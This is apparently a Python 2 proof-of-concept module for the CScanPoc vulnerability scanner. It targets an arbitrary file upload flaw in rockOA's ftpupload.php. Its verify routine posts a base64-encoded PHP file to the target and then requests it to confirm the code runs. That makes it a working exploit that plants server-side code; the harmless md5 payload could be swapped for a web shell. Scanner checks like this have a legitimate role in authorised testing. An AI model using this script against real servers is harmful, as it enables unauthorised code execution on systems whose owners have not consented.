# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '3038e73a-a2ba-461e-97d6-9459fbefa066'
    name = 'rockOA 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-12-11'  # 漏洞公布时间
    desc = '''
        rockOA ftpupload.php中函数没有用户身份判定，也没有文件类型过滤，导致任意文件上传。
    '''  # 漏洞描述
    ref = 'http://xiaomange.meximas.com/?p=317'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'rockOA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6f7f97e7-66dd-4671-b33b-98a6098c4b95'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            url = self.target + "/mode/upload/ftpupload.php"
            #proxy=('127.0.0.1',8080)
            #upload file 
            data = "filepath=&filename=test.php&content=PD9waHAgZWNobyBtZDUoMSk/Pg=="
            code, head, res, errcode, finalurl = hh.http(url, post=data)
            #visit  file 
            url1 = self.target + "/test.php"
            code, head, res, errcode, finalurl = hh.http(url1)

            if code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                #security_hole('file upload Vulnerable:'+url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
